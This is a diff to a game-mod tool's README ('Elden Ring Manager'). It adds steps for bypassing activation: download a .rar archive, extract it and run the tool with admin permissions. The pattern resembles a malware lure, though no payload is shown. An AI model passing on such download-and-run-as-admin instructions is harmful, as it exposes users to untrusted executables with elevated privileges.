@@ -2,6 +2,12 @@
 #IF YOU WANT TO USE THE SOFTWARE WITHOUT ACTIVATION CODE
 #USE ADMIN-ERM SCREENSHOTS Below:
 ```
+```diif
+-ERM ONLY RUNS WITH ADMIN PERMISSIONS AND WILL NOT WORK WITHOUT IT
+-DOWNLOAD ERM (Follow Screenshots below and download ADMIN.ERM.rar)
+-EXTRACT THE CONTENTS OF THE .RAR FILE
+-RUN ERM ADMIN
+```
 ![(Elden Ring Manager)](Screenshot2.PNG)
 ![(Elden Ring Manager)](Screenshot3.PNG)
 
@@ -46,7 +52,7 @@ C:\Program Files (x86)\Steam
 <br>
 
 ```diff
--Building for DEVELOPERS ONLY:
+-Building forv DEVELOPERS ONLY:
 Recommended branch is test. (ADMIN branch)
 C# Development Kit & .NETFramework For Visual Studio
 Clone Project and Open .sln File
